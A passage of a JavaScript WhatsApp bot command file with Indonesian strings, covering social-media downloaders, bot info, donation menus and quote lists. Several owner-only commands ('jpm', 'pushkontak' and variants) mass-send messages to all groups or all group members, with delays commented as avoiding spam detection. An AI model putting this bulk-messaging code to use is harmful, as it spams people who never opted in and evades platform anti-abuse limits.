                if (!text) return Replyx(`Example: ${prefix + command} url_instagram`, {
                    quoted: fkontak1
                })
                if (!text.includes('instagram.com')) return Replyx('Url Tidak Mengandung Result Dari Instagram!')
                Replyx(mess.wait)
                try {
                    const hasil = await instagramDl(text);
                    if (hasil.length < 0) return Replyx('Postingan Tidak Tersedia atau Privat!')
                    for (let i = 0; i < hasil.length; i++) {
                        await Xlesy.sendFileUrl(m.chat, hasil[i].url, 'Done', m)
                    }
                    setLimit(m, db)
                } catch (e) {
                    try {
                        let hasil = await fetchJson(api('hitori', '/download/instagram', {
                            url: text
                        }, 'apikey'))
                        if (hasil.result.length < 0) return Replyx('Postingan Tidak Tersedia atau Privat!')
                        for (let i = 0; i < hasil.result.length; i++) {
                            await Xlesy.sendFileUrl(m.chat, hasil.result[i].imageUrl, 'Done', m)
                        }
                        setLimit(m, db)
                    } catch (e) {
                        Replyx('Postingan Tidak Tersedia atau Privat!')
                    }
                }
            }
            break
            case 'igstory':
            case 'instagramstory':
            case 'instastory':
            case 'storyig': {
                if (!text) return Replyx(`Example: ${prefix + command} usernamenya`, {
                    quoted: fkontak1
                })
                try {
                    const hasil = await instaStory(text);
                    Replyx(mess.wait)
                    for (let i = 0; i < hasil.results.length; i++) {
                        await Xlesy.sendFileUrl(m.chat, hasil.results[i].url, 'Done', m)
                    }
                } catch (e) {
                    Replyx('Username tidak ditemukan atau Privat!');
                }
            }
            break
            case 'tiktok':
            case 'tiktokdown':
            case 'ttdown':
            case 'ttdl':
            case 'tt':
            case 'ttmp4':
            case 'ttvideo':
            case 'tiktokmp4':
            case 'tiktokvideo': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} url_tiktok`, {
                    quoted: fkontak1
                })
                if (!text.includes('tiktok.com')) return Replyx('Url Tidak Mengandung Result Dari Tiktok!')
                try {
                    const hasil = await tiktokDl(text);
                    Replyx(mess.wait)
                    if (hasil && hasil.size_nowm) {
                        await Xlesy.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
                    } else {
                        for (let i = 0; i < hasil.data.length; i++) {
                            await Xlesy.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i+1}`, m)
                        }
                    }
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Gagal/Url tidak valid!')
                }
            }
            break
            case 'ttmp3':
            case 'tiktokmp3':
            case 'ttaudio':
            case 'tiktokaudio': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} url_tiktok`, {
                    quoted: fkontak1
                })
                if (!text.includes('tiktok.com')) return Replyx('Url Tidak Mengandung Result Dari Tiktok!')
                try {
                    const hasil = await tiktokDl(text);
                    Replyx(mess.wait)
                    await m.reply({
                        audio: {
                            url: hasil.music_info.url
                        },
                        mimetype: 'audio/mpeg',
                        contextInfo: {
                            externalAdReply: {
                                title: 'TikTok • ' + hasil.author.nickname,
                                body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
                                previewType: 'PHOTO',
                                thumbnailUrl: hasil.cover,
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                sourceUrl: text
                            }
                        }
                    })
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Gagal/Url tidak valid!')
                }
            }
            break
            case 'fb':
            case 'fbdl':
            case 'fbdown':
            case 'facebook':
            case 'facebookdl':
            case 'facebookdown':
            case 'fbdownload':
            case 'fbmp4':
            case 'fbvideo': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} url_facebook`, {
                    quoted: fkontak1
                })
                if (!text.includes('facebook.com')) return Replyx('Url Tidak Mengandung Result Dari Facebook!')
                try {
                    const hasil = await facebookDl(text);
                    if (hasil.results.length < 1) {
                        Replyx('Video Tidak ditemukan!')
                    } else {
                        Replyx(mess.wait)
                        await Xlesy.sendFileUrl(m.chat, hasil.results[0].url, `*🎐Title:* ${hasil.caption}`, m);
                    }
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Server downloader facebook sedang offline!')
                }
            }
            break
            case 'mediafire': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} https://www.mediafire.com/file/xxxxxxxxx/xxxxx.zip/file`, {
                    quoted: fkontak1
                })
                if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return Replyx('Url Invalid!')
                try {
                    const anu = await mediafireDl(text)
                    await Xlesy.sendMedia(m.chat, anu.link, decodeURIComponent(anu.name), `*MEDIAFIRE DOWNLOADER*\n\n*${setv} Name* : ${decodeURIComponent(anu.name)}\n*${setv} Size* : ${anu.size}`, m)
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Server download sedang offline!')
                }
            }
            break
            case 'spotifydl': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} https://open.spotify.com/track/0JiVRyTJcJnmlwCZ854K4p`, {
                    quoted: fkontak1
                })
                if (!isUrl(args[0]) && !args[0].includes('open.spotify.com/track')) return Replyx('Url Invalid!')
                try {
                    const hasil = await spotifyDl(text);
                    Replyx(mess.wait)
                    await m.reply({
                        audio: {
                            url: hasil.download
                        },
                        mimetype: 'audio/mpeg',
                        contextInfo: {
                            externalAdReply: {
                                title: hasil.title,
                                body: clockString(hasil.duration),
                                previewType: 'PHOTO',
                                thumbnailUrl: hasil.cover,
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                sourceUrl: text
                            }
                        }
                    })
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Server download sedang offline!')
                }
            }
            break           
            //new Xlesy	
            
            case 'infobot': {
                let uptime = process.uptime(); // Waktu bot berjalan dalam detik
                let cpuModel = os.cpus()?.[0]?.model || "Tidak diketahui"; // Model CPU
                let totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + " GB"; // RAM total
                let freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + " GB"; // RAM tersedia
                let platform = os.platform(); // Platform OS
                let nodeVersion = process.version; // Versi Node.js
                let scVersion = "Xlesy VIP"; // Versi SC bot

                let message = `*\`INFO BOT - Xlesy\`*
> *Uptime:* ${Math.floor(uptime / 60)} Menit
> *CPU:* ${cpuModel}
> *RAM Total:* ${totalMem}
> *RAM Tersedia:* ${freeMem}
> *Platform:* ${platform}
> *Node.js:* ${nodeVersion}
> *Source Code:* ${scVersion}

• _Sistem ini berjalan secara real-time menggunakan optimasi Event-Driven Architecture berbasis Node.js, memastikan respons yang cepat dan efisien dalam menangani berbagai perintah pengguna. SC Xlesy dirancang dengan struktur modular yang memungkinkan fleksibilitas tinggi dalam pengembangan fitur baru tanpa mengganggu sistem utama. Dengan pendekatan ini, setiap fitur dapat diperbarui atau ditambahkan secara dinamis, sehingga bot tetap relevan dan adaptif terhadap kebutuhan pengguna._

_Selain itu, untuk menjaga performa maksimal, bot ini menggunakan cache memory guna mengurangi beban server dan mempercepat pemrosesan data. Dengan pemanfaatan proses asinkron, bot dapat menangani banyak permintaan secara bersamaan tanpa mengalami keterlambatan atau bottleneck. Sistem ini juga mendukung load balancing, yang membantu menjaga stabilitas saat menangani volume pengguna yang tinggi._

_Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak hanya cepat dan stabil tetapi juga aman dan scalable. Sistem ini dapat diperluas dengan integrasi API pihak ketiga, memungkinkan koneksi dengan berbagai layanan eksternal seperti database cloud, AI chatbot, sistem pembayaran, dan layanan autentikasi OTP. Semua fitur ini dirancang untuk memberikan pengalaman pengguna terbaik dengan efisiensi maksimal._

`;

                Xlesy.sendMessage(m.chat, {
                    text: message
                }, {
                    quoted: ftroli
                });
                break;
            }
            case 'replay': {
                if (!isOwner) return Replyx('❌ Hanya owner yang bisa menggunakan perintah ini.', {
                    quoted: fkontak1
                });

                let args = m.text.split(' ');
                if (args.length < 3) return Replyx('⚠️ Format salah! Gunakan: *!balas/replay 628xxxxx pesan*', {
                    quoted: fkontak1
                });

                let target = args[1]; // Nomor atau ID grup
                let replyMessage = args.slice(2).join(' '); // Pesan yang akan dikirim

                if (target.includes('@g.us')) {
                    // Jika target adalah grup
                    await Xlesy.sendMessage(target, {
                        text: replyMessage
                    }, {
                        quoted: fkontak1
                    });
                    await m.reply(`✅ Pesan berhasil dikirim ke grup ${target}`, {
                        quoted: fkontak1
                    });
                } else {
                    // Jika target adalah nomor pribadi
                    let targetNumber = target + '@s.whatsapp.net';
                    await Xlesy.sendMessage(targetNumber, {
                        text: replyMessage
                    }, {
                        quoted: fkontak1
                    });
                    await Replyx('✅ Pesan berhasil dikirim ke ' + target, {
                        quoted: fkontak1
                    });
                }
                break;
            }
            case 'replay1': {
                if (!isOwner) return Replyx('❌ Hanya owner yang bisa menggunakan perintah ini.', {
                    quoted: fkontak1
                })

                let args = m.text.split(' ')
                if (args.length < 3) return Replyx('⚠️ Format salah! Gunakan: *!balas/replay 628xxxxx pesan*', {
                    quoted: fkontak1
                })

                let targetNumber = args[1] + '@s.whatsapp.net' // Nomor tujuan  
                let replyMessage = args.slice(2).join(' ') // Ambil pesan setelah nomor  

                await Xlesy.sendMessage(targetNumber, {
                    text: replyMessage
                })
                await Replyx('✅ Pesan berhasil dikirim ke ' + args[1], {
                    quoted: fkontak1
                })
                break
            }
            case 'cekfitur':
            case 'carifitur':
            case 'cekfiturme': {
                // Membaca isi file Xlesy.js
                if (!q) Replyx('Example: .cekfitur menu')
                Replyx(mess.load)
                let fileContent = fs.readFileSync('Xlesy.js', 'utf8')

                // Mencari semua case yang terdaftar dalam bot
                let regex = /case\s+'([^']+)'/g;
                let matches = [...fileContent.matchAll(regex)]

                if (matches.length === 0) {
                    return Replyx("Tidak ada fitur yang terdaftar di bot!")
                }

                // Jika pengguna tidak memasukkan kata kunci, tampilkan semua fitur
                if (!text) {
                    let fiturList = matches.map((match, index) => `${index + 1}. ${match[1]}`, {
                        quoted: fkontak1
                    }).join("\n")
                    return Replyx(`🔍 *Daftar Semua Fitur yang Tersedia:*\n\n${fiturList}`, {
                        quoted: fkontak1
                    })
                }

                // Jika pengguna memasukkan kata kunci, cari fitur yang sesuai
                let searchResults = matches
                    .filter(match => match[1].toLowerCase().includes(text.toLowerCase()))
                    .map((match, index) => `${index + 1}. ${match[1]}`, {
                        quoted: fkontak1
                    })
                    .join("\n")

                if (!searchResults) {
                    return m.reply(`❌ _Fiur *${text}* tidak ada dalam daftar BOT_.`, {
                        quoted: fkontak1
                    })
                }

                m.reply(`🔍 *Hasil Pencarian untuk:* "${text}"\n\n${searchResults}`, {
                    quoted: fkontak1
                })
            }
            break

            case 'svsontact': {
                if (!m.quoted) return Replyx('Reply ke pesan yang ingin disimpan sebagai kontak.')
                if (!text) return Replyx('Tambahkan nama kontak setelah perintah, contoh: .svcontact Nama Kontak')

                let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${text}\nTEL;waid=${m.quoted.sender.split('@')[0]}:${m.quoted.sender.split('@')[0]}\nEND:VCARD`;

                let contactMessage = {
                    displayName: text,
                    vcard: vcard
                }

                await Xlesy.sendMessage(m.chat, {
                    contacts: {
                        displayName: text,
                        contacts: [contactMessage]
                    }
                }, {
                    quoted: fkontak1
                })
                m.reply(`Kontak ${text} berhasil disimpan.`, {
                    quoted: fkontak1
                })
            }
            break

            const blacklistWords = ['anjing', 'babi', 'tolol', 'bangsat']; // Tambahkan kata-kata yang ingin dihapus
            // Auto Delete Pesan Tertentu
            if (m.message) {
                let textMessage = (m.type === 'conversation') ? m.message.conversation :
                    (m.type == 'imageMessage') ? m.message.imageMessage.caption :
                    (m.type == 'videoMessage') ? m.message.videoMessage.caption :
                    (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : '';

                if (textMessage) {
                    let isBlacklisted = blacklistWords.some(word => textMessage.toLowerCase().includes(word));
                    if (isBlacklisted) {
                        await Xlesy.sendMessage(m.chat, {
                            delete: {
                                remoteJid: m.chat,
                                fromMe: false,
                                id: m.key.id,
                                participant: m.sender
                            }
                        });
                        await Xlesy.sendMessage(m.chat, {
                            text: `⚠️ Pesan dari @${m.sender.split('@')[0]} telah dihapus karena mengandung kata terlarang!`,
                            mentions: [m.sender]
                        }, {
                            quoted: fkontak1
                        })
                    }
                }
            }

            case 'musicmenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
╭──┈➤「 *MUSIC MENU* 」❍ 
│  ${setv} ${prefix}music1 sampai music85
│  ${setv} ${prefix}sad1 sampai sad35
│  ${setv} ${prefix}sound1 sampai sound161
╰────────┈➤
     `
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break                                   
            case 'mlnews': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🔍',
                        key: m.key
                    }
                })
                const axios = require('axios')
                const cheerio = require('cheerio')

                const url = 'https://www.oneesports.gg/mobile-legends/';

                async function scrapeMLNews() {
                    try {
                        const {
                            data
                        } = await axios.get(url)
                        const $ = cheerio.load(data)
                        let articles = []

                        $('.row.tab-box').each((index, element) => {
                            let category = $(element).find('.cat-name').text().trim()
                            let title = $(element).find('h2 a').text().trim()
                            let link = $(element).find('h2 a').attr('href')
                            let description = $(element).find('h3 p').text().trim()
                            let author = $(element).find('.author').text().trim()
                            let authorLink = $(element).find('.author').attr('href')
                            let publishTime = $(element).find('span[data-publish-time]').text().trim()
                            let image = $(element).find('img').attr('data-src')

                            articles.push({
                                category,
                                title,
                                link,
                                description,
                                author,
                                authorLink,
                                publishTime,
                                image
                            });
                        });

                        let message = ''
                        articles.forEach(article => {
                            message += `${article.title}\n${article.description}\n${article.link}\n\n`
                        })

                        if (!message) return Replyx('Tidak dapat menemukan berita Mobile Legends saat ini', {
                            quoted: fkontak1
                        })

                        m.reply(message)
                    } catch (error) {
                        console.error('Error fetching data:', error)
                        Replyx('_Server sedan offline', {
                            quoted: fkontak1
                        })
                    }
                }

                scrapeMLNews()
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '✅',
                        key: m.key
                    }
                })
            }
            break
            case 'donate':
            case 'pay':
case 'payment': {
  await Xlesy.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  const url = "https://files.catbox.moe/t6sw8o.jpg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: Xlesy.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `Berikut daftar metode pembayaran saya ya~`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/dana.jpg' } }, { upload: Xlesy.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: author,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol DANA di bawah\n> DANA A/N: ${dana}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment DANA\",\"id\":\"123456789\",\"copy_code\":\"${dana}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/gopay.jpg' } }, { upload: Xlesy.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: author,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol GOPAY di bawah\n> GOPAY A/N: ${gopay}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment GOPAY\",\"id\":\"123456789\",\"copy_code\":\"${gopay}\"}`
                      },
                    ],
                  },
                },
                {
                header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/ovo.jpg' } }, { upload: Xlesy.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: author,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol OVO di bawah\n> OVO A/N: ${ovo}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment OVO\",\"id\":\"123456789\",\"copy_code\":\"${gopay}\"}`
                      },
                    ],
                  },
                },
                {
                header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/pulsa.jpg' } }, { upload: Xlesy.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: author,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol PULSA di bawah\n> PULSA A/N: ${pulsa}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment PULSA\",\"id\":\"123456789\",\"copy_code\":\"${gopay}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/qris.jpg' } }, { upload: Xlesy.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: author,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> SCAN di atas / klik tombol untuk copy llink` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment QRIS\",\"id\":\"123456789\",\"copy_code\":\"${qris}\"}`
                      },
                    ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: fkontak1 }
  );

  await Xlesy.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break;
              case "teksjpm": {
                if (!isOwner) return Replyx(msg.owner)
              Replyx(fs.readFileSync("./database/teksjpm.js").toString())
            }
            break
            case "jpm": {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '⏳',
                        key: m.key
                    }
                });

                // Hanya bisa digunakan di chat pribadi
                if (m.isGroup) return Replyx("Perintah ini hanya bisa digunakan di chat pribadi!", {
                    quoted: fkontak1
                });
                if (!isOwner) return Replyx(msg.owner);

                // Ambil daftar semua grup yang bot masuk
                let allGroups = await Xlesy.groupFetchAllParticipating();
                let groupIds = Object.keys(allGroups);

                // Ambil teks JPM dari file
                let teksJPM = fs.existsSync("./database/teksjpm.js") ? fs.readFileSync("./database/teksjpm.js").toString() : "";
                if (!teksJPM) return Replyx("Teks JPM belum diset. Gunakan perintah *.setteksjpm* untuk mengatur teks JPM!", {
                    quoted: fkontak1
                });

                let senderName = m.pushName || "Admin";
                let message = `${teksJPM}\n\n> ${senderName}`; // Format pesan JPM

                let successCount = 0;

                for (let groupId of groupIds) {
                    try {
                        await Xlesy.sendMessage(groupId, {
                            text: message
                        });
                        successCount++;
                        await new Promise(resolve => setTimeout(resolve, 5000)); // Delay agar tidak dianggap spam
                    } catch (err) {
                        console.error(`Gagal mengirim JPM ke grup: ${groupId}`, err);
                    }
                }

                Replyx(`JPM berhasil dikirim ke ${successCount} grup! ✅`, {
                    quoted: fkontak1
                });
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '✅',
                        key: m.key
                    }
                });
            }
            break;
            case "setteksjpm": {
if (!isOwner) return Replyx(msg.owner);
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./database/teksjpm.js", newteks.toString())
Replyx("Berhasil Mengganti Teks JPM ✅")
} else {
return Replyx("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*")
}}
break
            case 'pushkontak': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '⏳',
                        key: m.key
                    }
                })
                if (!m.isGroup) return Replyx('Perintah ini hanya bisa digunakan di dalam grup!', {
                    quoted: fkontak1
                })
                if (!isCreator) return Replyx(mess.owner)
                if (!text) return Replyx('Masukkan pesan yang ingin dikirim ke semua anggota grup!', {
                    quoted: fkontak1
                })

                let metadata = await Xlesy.groupMetadata(m.chat)
                let participants = metadata.participants.map(v => v.id)
                let senderName = m.pushName || 'Admin' // Nama pengirim (fallback ke 'Admin' jika tidak tersedia)

                let message = `${text}\n\n> XLESYVIP` // Format pesan dengan nama pengirim

                for (let user of participants) {
                    await Xlesy.sendMessage(user, {
                        text: message
                    })
                    await new Promise(resolve => setTimeout(resolve, 5000)) // Delay agar tidak dianggap spam
                }
                Replyx(`Pesan berhasil dikirim ke ${participants.length} anggota grup!`, {
                    quoted: fkontak1
                })
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '✅',
                        key: m.key
                    }
                })
            }
            break

            case 'pushkontak1': {
                if (!m.isGroup) return Replyx('Fitur ini hanya dapat digunakan di grup.', {
                    quoted: fkontak1
                })
                if (!isCreator) return Replyx('Hanya owner yang dapat menggunakan fitur ini.', {
                    quoted: fkontak1
                })

                try {
                    const groupMetadata = await Xlesy.groupMetadata(m.chat)
                    const participants = groupMetadata.participants

                    if (!text) return Replyx('Silakan masukkan pesan yang ingin dikirim.', {
                        quoted: fkontak1
                    })

                    const pesan = text.trim()
                    let success = 0
                    let failed = 0

                    for (let member of participants) {
                        const memberId = member.id
                        try {
                            await Xlesy.sendMessage(memberId, {
                                text: pesan,
                                mentions: [memberId]
                            })
                            console.log(`Pesan berhasil dikirim ke: ${memberId}`, {
                                quoted: fkontak1
                            })
                            success++;
                        } catch (error) {
                            console.error(`Gagal mengirim pesan ke: ${memberId}`, error)
                            failed++
                        }
                        await sleep(1000); // Delay 1 detik
                    }

                    m.reply(`Push pesan selesai.\n✅ Berhasil: ${success}\n❌ Gagal: ${failed}`, {
                        quoted: fkontak1
                    })
                } catch (error) {
                    console.error(error)
                    Replyx('Terjadi kesalahan dalam mengambil metadata grup.', {
                        quoted: fkontak1
                    })
                }
                break
            }

            case 'pushkontakid': {
                if (!isCreator) return Replyx('Fitur ini hanya dapat digunakan oleh owner.', {
                    quoted: fkontak1
                })

                const args = text.split('|')
                if (args.length < 2) return m.reply(`Gunakan format:\n${prefix}pushkontakid <id_grup>|<pesan>\n\nContoh:\n${prefix}pushkontakid 1234567890-123456789@g.us|Halo semua!`, {
                    quoted: fkontak1
                })

                const groupId = args[0].trim()
                const pesan = args[1].trim()

                try {
                    const groupMetadata = await Xlesy.groupMetadata(groupId)
                    const participants = groupMetadata.participants;

                    let success = 0
                    let failed = 0

                    for (let member of participants) {
                        const memberId = member.id
                        try {
                            await Xlesy.sendMessage(memberId, {
                                text: pesan,
                                mentions: [memberId]
                            })
                            console.log(`Pesan berhasil dikirim ke: ${memberId}`, {
                                quoted: fkontak1
                            })
                            success++
                        } catch (error) {
                            console.error(`Gagal mengirim pesan ke: ${memberId}`, error)
                            failed++
                        }
                        await sleep(1000) // Delay 1 detik
                    }

                    m.reply(`Push pesan selesai.\n✅ Berhasil: ${success}\n❌ Gagal: ${failed}`, {
                        quoted: fkontak1
                    })
                } catch (error) {
                    console.error(error)
                    Replyx('Gagal mendapatkan metadata grup. Pastikan ID grup benar dan bot ada di dalam grup tersebut.', {
                        quoted: fkontak1
                    })
                }
                break
            }

            // Quotes Menu
            case 'quotessad': {
                const quotes = [
                    "“Kadang, diam adalah cara terbaik untuk memberitahu bahwa kita sedang terluka.”",
                    "“Tidak semua luka terlihat, tidak semua kesedihan bisa dijelaskan dengan kata-kata.”",
                    "“Aku tersenyum bukan karena bahagia, tapi karena aku sudah terbiasa berpura-pura.”",
                    "“Semakin kita peduli, semakin besar peluang untuk terluka.”",
                    "“Terkadang, orang yang paling kamu cintai adalah orang yang paling menyakitimu.”",
                    "“Aku baik-baik saja, adalah kebohongan terbesar yang sering aku ucapkan.”",
                    "“Ketika seseorang berubah, itu bukan karena mereka ingin, tapi karena mereka lelah terluka.”",
                    "“Tidak ada yang lebih menyakitkan selain berpura-pura bahagia ketika hatimu sedang hancur.”",
                    "“Beberapa orang akan tetap tinggal dalam hatimu, meski mereka telah pergi dari hidupmu.”",
                    "“Aku tidak marah karena kamu berbohong, aku marah karena aku tidak bisa mempercayaimu lagi.”",
                    "“Hujan tahu bagaimana cara menyembunyikan air mata.”",
                    "“Seseorang bisa tersenyum setiap hari, tetapi tetap memiliki hati yang hancur di dalam.”",
                    "“Berhenti berharap adalah cara terbaik untuk menghindari kekecewaan.”",
                    "“Kadang kita harus menerima bahwa beberapa orang hanya bagian dari cerita, bukan masa depan kita.”",
                    "“Aku selalu ada saat kamu butuh, tapi kamu selalu hilang saat aku butuh.”",
                    "“Mungkin aku hanya kesalahan dalam hidupmu, tapi bagiku kamu adalah kenangan yang tak bisa aku lupakan.”",
                    "“Mencintai seseorang yang tidak mencintaimu kembali adalah bentuk tersulit dari patah hati.”",
                    "“Jika mencintaimu adalah kesalahan, maka aku telah melakukan kesalahan yang sama berulang kali.”",
                    "“Terkadang, orang yang paling kuat di luar adalah orang yang paling hancur di dalam.”",
                    "“Kamu pergi tanpa alasan, meninggalkanku dengan seribu pertanyaan.”",
                    "“Orang yang paling tersakiti adalah mereka yang paling banyak tersenyum.”",
                    "“Ada saatnya aku lelah berpura-pura kuat.”",
                    "“Jangan tanya kenapa aku berubah, tanya kenapa kamu tidak pernah peduli.”",
                    "“Rasa sakit mengajarkanku bagaimana cara bertahan, tapi tidak mengajarkanku bagaimana cara melupakan.”",
                    "“Aku berharap bisa kembali ke masa di mana aku tidak mengenalmu.”",
                    "“Mungkin aku memang bukan siapa-siapa bagimu, tapi kamu adalah segalanya bagiku.”",
                    "“Aku tidak butuh alasan untuk mencintaimu, tapi aku butuh seribu alasan untuk melupakanmu.”",
                    "“Aku selalu memilihmu, tapi kamu selalu memilih orang lain.”",
                    "“Bukan perpisahan yang menyakitkan, tapi kenangan yang tertinggal setelahnya.”",
                    "“Seseorang pernah berkata padaku, ‘Jangan terlalu berharap’, tapi aku tidak mendengarkan.”"
                ];

                let randomQuote = quotes[Math.floor(Math.random() * quotes.length)]
                m.reply(`😢 *Quotes Sedih* 😢\n\n${randomQuote}`, {
                    quoted: fkontak1
                })
            }
            break

            case 'quotesislamic': {
                const quotes = [
                    "“Sesungguhnya bersama kesulitan ada kemudahan.” (QS. Al-Insyirah: 6)",
                    "“Janganlah kamu bersikap lemah, dan jangan (pula) bersedih hati, padahal kamulah orang-orang yang paling tinggi derajatnya jika kamu beriman.” (QS. Ali Imran: 139)",
                    "“Allah tidak membebani seseorang melainkan sesuai dengan kesanggupannya.” (QS. Al-Baqarah: 286)",
                    "“Dan bertawakallah kepada Allah. Cukuplah Allah sebagai Pelindung.” (QS. Al-Ahzab: 3)",
                    "“Dan janganlah kamu berputus asa dari rahmat Allah.” (QS. Az-Zumar: 53)",
                    "“Barang siapa bertakwa kepada Allah, niscaya Dia akan mengadakan baginya jalan keluar.” (QS. At-Talaq: 2)",
                    "“Ketahuilah, hanya dengan mengingat Allah hati menjadi tenteram.” (QS. Ar-Ra'd: 28)",
                    "“Mintalah pertolongan kepada Allah dengan sabar dan shalat.” (QS. Al-Baqarah: 153)",
                    "“Dan Aku tidak menciptakan jin dan manusia melainkan supaya mereka menyembah-Ku.” (QS. Adz-Dzariyat: 56)",
                    "“Tugas kita bukan untuk berhasil, tapi untuk berusaha. Karena di dalam usaha itulah kita menemukan dan belajar dari kegagalan.”",
                    "“Jangan bangga dengan apa yang dunia berikan, tapi banggalah dengan apa yang Allah berikan kepadamu.”",
                    "“Perbaiki hubunganmu dengan Allah, maka Allah akan memperbaiki hubunganmu dengan manusia.”",
                    "“Siapa yang berjalan untuk mencari ilmu, Allah akan mudahkan jalannya menuju surga.” (HR. Muslim)",
                    "“Harta tidak akan berkurang karena sedekah.” (HR. Muslim)",
                    "“Jangan menjelaskan tentang dirimu kepada siapa pun, karena yang menyukaimu tidak butuh itu, dan yang membencimu tidak percaya itu.”",
                    "“Allah tidak melihat bentuk tubuh dan harta kalian, tetapi Dia melihat hati dan amal kalian.” (HR. Muslim)",
                    "“Sebaik-baik manusia adalah yang paling bermanfaat bagi manusia lain.” (HR. Ahmad)",
                    "“Barang siapa berbuat kebaikan sebesar dzarrah, niscaya ia akan melihat balasannya.” (QS. Az-Zalzalah: 7)",
                    "“Barang siapa yang bersungguh-sungguh, maka ia akan berhasil.”",
                    "“Orang yang paling kuat adalah yang mampu menahan amarahnya.” (HR. Bukhari & Muslim)",
                    "“Barang siapa yang beriman kepada Allah dan hari akhir, hendaklah ia berkata baik atau diam.” (HR. Bukhari & Muslim)",
                    "“Shalat adalah tiang agama, siapa yang mendirikannya maka ia telah menegakkan agama.”",
                    "“Jangan sibuk mencari kesalahan orang lain, perbaikilah dirimu sendiri terlebih dahulu.”",
                    "“Kehidupan dunia hanyalah kesenangan yang memperdaya.” (QS. Al-Hadid: 20)",
